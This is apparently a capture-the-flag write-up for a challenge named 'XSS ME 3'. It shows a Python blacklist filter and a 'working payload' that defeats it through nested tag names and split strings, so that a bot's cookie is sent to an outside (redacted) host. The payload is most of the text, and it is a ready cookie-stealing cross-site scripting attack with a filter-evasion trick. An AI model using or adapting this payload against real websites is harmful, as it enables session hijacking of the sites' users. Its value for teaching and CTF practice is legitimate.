@@ -1,0 +1,18 @@
+XSS ME 3
+Write a payload to be sent to the bot! Your goal is to steal his cookies.
+
+You have to bypass this filter:
+
+def filter_3(payload):
+    if "://" in payload.lower():
+return "Nope"
+    if "document" in payload.lower():
+return "Nope"
+    if "cookie" in payload.lower():
+return "Nope"
+    return payload.lower().replace("script", "").replace("img", "").replace("svg", "")
+
+
+Working Payload
+
+<scrscriptipt>window["docu"+"ment"].location.replace("//xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx/?c="+window["docu"+"ment"]["cook"+"ie"])</scrscriptipt>
